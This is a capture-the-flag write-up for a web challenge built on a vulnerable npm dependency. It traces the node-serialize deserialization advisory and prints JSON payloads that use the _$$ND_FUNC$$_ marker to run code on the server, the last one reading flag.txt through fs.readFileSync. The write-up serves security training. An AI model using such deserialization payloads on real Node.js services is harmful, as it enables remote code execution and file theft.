# the npm package
Author: starsiv
## Description
```
Category: web

Install those npm packages they said, It will be helpful they said!

Download `chall.tar.gz`, build and run locally before visiting `http://localhost:3000` 
```
$ tar xzf chall.tar.gz && cd chall
$ docker build -t thepackage:latest .
$ docker run -p 3000:3000 --rm -it thepackage:latest
```
```
## Provided challenge files
* [chall.tar.gz](chall.tar.gz)


---

By downloading the .tar.gz file and running `npm install` we see `npm` triggering on node-serialize with:
https://github.com/advisories/GHSA-q4v7-4rhw-9hqm

This leads to https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ where we discover that we can invoke functions like this:

```
{
 "hello": "_$$ND_FUNC$$_function(){return 'world'}()"
}
```

All we have to to now is to use `fs` and `readFileSync` to get the file contents:

```
{
 "hello": "_$$ND_FUNC$$_function(){return require('fs').readFileSync('flag.txt','utf8') }()"
}
```

